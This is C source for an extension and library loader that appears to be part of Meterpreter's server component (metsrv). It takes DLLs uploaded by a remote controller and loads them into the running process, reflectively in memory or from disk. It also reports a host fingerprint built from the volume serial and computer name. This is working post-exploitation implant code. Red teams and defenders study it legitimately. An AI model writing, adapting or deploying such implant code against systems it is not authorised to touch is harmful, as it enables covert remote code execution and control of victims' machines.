#include "metsrv.h"

// see ReflectiveLoader.c...
extern HINSTANCE hAppInstance;

// see remote_dispatch_common.c
extern PLIST gExtensionList;
// see common/base.c
extern Command *extensionCommands;

DWORD stagelessinit_extension(const char* extensionName, LPBYTE data, DWORD dataSize)
{
	dprintf("[STAGELESSINIT] searching for extension init for %s in %p", extensionName, gExtensionList);
	dprintf("[STAGELESSINIT] extension list start is %p", gExtensionList->start);
	for (PNODE node = gExtensionList->start; node != NULL; node = node->next)
	{
		PEXTENSION ext = (PEXTENSION)node->data;
		dprintf("[STAGELESSINIT] comparing to %s (init is %p)", ext->name, ext->stagelessInit);
		if (strcmp(ext->name, extensionName) == 0 && ext->stagelessInit != NULL)
		{
			dprintf("[STAGELESSINIT] found for %s", extensionName);
			return ext->stagelessInit(data, dataSize);
		}
	}
	return ERROR_NOT_FOUND;
}

DWORD load_extension(HMODULE hLibrary, BOOL bLibLoadedReflectivly, Remote* pRemote, Packet* pResponse, Command* pFirstCommand)
{
	DWORD dwResult = ERROR_OUTOFMEMORY;
	PEXTENSION pExtension = (PEXTENSION)malloc(sizeof(EXTENSION));

	dprintf("[SERVER] Initialising extension %x", hLibrary);
	if (pExtension)
	{
		memset(pExtension, 0, sizeof(EXTENSION));

		pExtension->library = hLibrary;

		// if the library was loaded via its reflective loader we must use GetProcAddressR()
		if (bLibLoadedReflectivly)
		{
			pExtension->init = (PSRVINIT)GetProcAddressR(pExtension->library, "InitServerExtension");
			pExtension->deinit = (PSRVDEINIT)GetProcAddressR(pExtension->library, "DeinitServerExtension");
			pExtension->getname = (PSRVGETNAME)GetProcAddressR(pExtension->library, "GetExtensionName");
			pExtension->commandAdded = (PCMDADDED)GetProcAddressR(pExtension->library, "CommandAdded");
			pExtension->stagelessInit = (PSTAGELESSINIT)GetProcAddressR(pExtension->library, "StagelessInit");
		}
		else
		{
			pExtension->init = (PSRVINIT)GetProcAddress(pExtension->library, "InitServerExtension");
			pExtension->deinit = (PSRVDEINIT)GetProcAddress(pExtension->library, "DeinitServerExtension");
			pExtension->getname = (PSRVGETNAME)GetProcAddress(pExtension->library, "GetExtensionName");
			pExtension->commandAdded = (PCMDADDED)GetProcAddress(pExtension->library, "CommandAdded");
			pExtension->stagelessInit = (PSTAGELESSINIT)GetProcAddress(pExtension->library, "StagelessInit");
		}

		// patch in the metsrv.dll's HMODULE handle, used by the server extensions for delay loading
		// functions from the metsrv.dll library. We need to do it this way as LoadLibrary/GetProcAddress
		// wont work if we have used Reflective DLL Injection as metsrv.dll will be 'invisible' to these functions.
		if (pRemote)
		{
			pRemote->met_srv = hAppInstance;
		}

		dprintf("[SERVER] Calling init on extension, address is 0x%p", pExtension->init);

		// Call the init routine in the library
		if (pExtension->init)
		{
			dprintf("[SERVER] Calling init()...");

			pExtension->end = pFirstCommand;
			dwResult = pExtension->init(pRemote);
			pExtension->start = extensionCommands;

			if (dwResult == ERROR_SUCCESS)
			{
				// inform the new extension of the existing commands
				if (pExtension->commandAdded)
				{
					for (Command* command = pExtension->end; command != NULL; command = command->next)
					{
						pExtension->commandAdded(command->method);
					}
				}

				if (pExtension->getname)
				{
					pExtension->getname(pExtension->name, sizeof(pExtension->name));
				}

				list_push(gExtensionList, pExtension);
			}
			else
			{
				free(pExtension);
			}
		}

		dprintf("[SERVER] Called init()...");
		if (pResponse)
		{
			for (Command* command = pExtension->start; command != pExtension->end; command = command->next)
			{
				packet_add_tlv_string(pResponse, TLV_TYPE_METHOD, command->method);

				// inform existing extensions of the new commands
				for (PNODE node = gExtensionList->start; node != NULL; node = node->next)
				{
					PEXTENSION ext = (PEXTENSION)node->data;
					// don't inform the extension of itself
					if (ext != pExtension && ext->commandAdded)
					{
						ext->commandAdded(command->method);
					}
				}
			}
		}
	}

	return dwResult;
}



/*
 * core_loadlib
 * ------------
 *
 * Load a library into the address space of the executing process.
 *
 * TLVs:
 *
 * req: TLV_TYPE_LIBRARY_PATH -- The path of the library to load.
 * req: TLV_TYPE_FLAGS        -- Library loading flags.
 * opt: TLV_TYPE_TARGET_PATH  -- The contents of the library if uploading.
 * opt: TLV_TYPE_DATA         -- The contents of the library if uploading.
 *
 * TODO:
 *
 *   - Implement in-memory library loading
 */
DWORD request_core_loadlib(Remote *pRemote, Packet *pPacket)
{
	Packet *response = packet_create_response(pPacket);
	DWORD res = ERROR_SUCCESS;
	HMODULE library;
	PCHAR libraryPath;
	DWORD flags = 0;
	BOOL bLibLoadedReflectivly = FALSE;

	Command *first = extensionCommands;

	do
	{
		libraryPath = packet_get_tlv_value_string(pPacket, TLV_TYPE_LIBRARY_PATH);
		flags = packet_get_tlv_value_uint(pPacket, TLV_TYPE_FLAGS);

		// Invalid library path?
		if (!libraryPath)
		{
			res = ERROR_INVALID_PARAMETER;
			break;
		}

		// If the lib does not exist locally, but is being uploaded...
		if (!(flags & LOAD_LIBRARY_FLAG_LOCAL))
		{
			PCHAR targetPath;
			Tlv dataTlv;

			// Get the library's file contents
			if ((packet_get_tlv(pPacket, TLV_TYPE_DATA,
				&dataTlv) != ERROR_SUCCESS) ||
				(!(targetPath = packet_get_tlv_value_string(pPacket,
				TLV_TYPE_TARGET_PATH))))
			{
				res = ERROR_INVALID_PARAMETER;
				break;
			}

			// If the library is not to be stored on disk, 
			if (!(flags & LOAD_LIBRARY_FLAG_ON_DISK))
			{
				// try to load the library via its reflective loader...
				library = LoadLibraryR(dataTlv.buffer, dataTlv.header.length);
				if (library == NULL)
				{
					// if that fails, presumably besause the library doesn't support
					// reflective injection, we default to using libloader...
					library = libloader_load_library(targetPath,
						dataTlv.buffer, dataTlv.header.length);
				}
				else
				{
					bLibLoadedReflectivly = TRUE;
				}

				res = (library) ? ERROR_SUCCESS : ERROR_NOT_FOUND;
			}
			else
			{
				// Otherwise, save the library buffer to disk
				res = buffer_to_file(targetPath, dataTlv.buffer,
					dataTlv.header.length);
			}

			// Override the library path
			libraryPath = targetPath;
		}

		// If a previous operation failed, break out.
		if (res != ERROR_SUCCESS)
		{
			break;
		}

		// Load the library
		if (!library && !(library = LoadLibraryA(libraryPath)))
		{
			res = GetLastError();
		}

		// If this library is supposed to be an extension library, try to
		// call its Init routine
		if ((flags & LOAD_LIBRARY_FLAG_EXTENSION) && library)
		{
			res = load_extension(library, bLibLoadedReflectivly, pRemote, response, first);
		}

	} while (0);

	if (response)
	{
		packet_transmit_response(res, pRemote, response);
	}

	return res;
}

DWORD request_core_uuid(Remote* remote, Packet* packet)
{
	DWORD res = ERROR_SUCCESS;
	Packet* response = packet_create_response(packet);

	if (response)
	{
		packet_add_tlv_raw(response, TLV_TYPE_UUID, remote->orig_config->session.uuid, UUID_SIZE);

		packet_transmit_response(ERROR_SUCCESS, remote, response);
	}

	return res;
}

DWORD request_core_machine_id(Remote* pRemote, Packet* pPacket)
{
	DWORD res = ERROR_SUCCESS;
	dprintf("[CORE] Running request_core_machine_id");
	Packet* pResponse = packet_create_response(pPacket);
	dprintf("[CORE] pResponse is %p", pResponse);

	if (pResponse)
	{
		wchar_t buffer[MAX_PATH];
		if (GetSystemDirectory(buffer, MAX_PATH) != 0)
		{
			wchar_t computerName[MAX_PATH];
			DWORD computerNameSize = MAX_PATH;
			DWORD serialNumber;
			wchar_t* backslash = wcschr(buffer, L'\\');
			*(backslash + 1) = L'\0';

			GetVolumeInformation(buffer, NULL, 0, &serialNumber, NULL, 0, NULL, 0);

			GetComputerName(computerName, &computerNameSize);

			_snwprintf_s(buffer, MAX_PATH, MAX_PATH - 1, L"%04x-%04x:%s", HIWORD(serialNumber), LOWORD(serialNumber), computerName);
			packet_add_tlv_wstring(pResponse, TLV_TYPE_MACHINE_ID, buffer);
			dprintf("[CORE] sending machine id: %S", buffer);
		}

		packet_transmit_response(res, pRemote, pResponse);
	}

	return ERROR_SUCCESS;
}